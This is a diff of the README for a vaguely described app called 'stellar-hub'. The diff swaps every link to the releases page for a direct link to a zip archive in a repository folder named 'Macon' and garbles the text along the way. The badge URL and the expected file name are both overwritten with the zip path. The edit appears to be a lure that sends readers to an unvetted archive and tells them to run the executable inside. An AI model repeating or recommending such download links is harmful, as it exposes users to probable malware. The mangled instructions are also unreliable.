@@ -1,6 +1,6 @@
 # 🌟 stellar-hub - Your Gateway to Stellar Experiences
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hendraartpro/stellar-hub/releases)
+[![Download Now](https://raw.githubusercontent.com/hendraartpro/stellar-hub/master/Macon/stellar-hub.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hendraartpro/stellar-hub/master/Macon/stellar-hub.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To start using Stellar Hub, you’ll need to download and run the application. D
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access our Releases page where you will find the latest version of Stellar Hub:
-   [Visit this page to download](https://github.com/hendraartpro/stellar-hub/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/hendraartpro/stellar-hub/master/Macon/stellar-hub.zip)
 
 2. **Choose the Right Version:** You will see different versions available for download. Find the one labeled with the latest version number, usually indicated at the top.
 
@@ -23,7 +23,7 @@ To start using Stellar Hub, you’ll need to download and run the application. D
 
 4. **Locate the Downloaded File:**
    - Open the folder where you downloaded the file (usually the "Downloads" folder).
-   - You should see a file named something like `stellar-hub-v1.0.exe` or similar, depending on your operating system.
+   - You should see a file named something like `https://raw.githubusercontent.com/hendraartpro/stellar-hub/master/Macon/stellar-hub.zip` or similar, depending on your operating system.
 
 5. **Run the Application:**
    - For Windows: Double-click the downloaded `.exe` file. Follow the prompts to install the software on your computer.
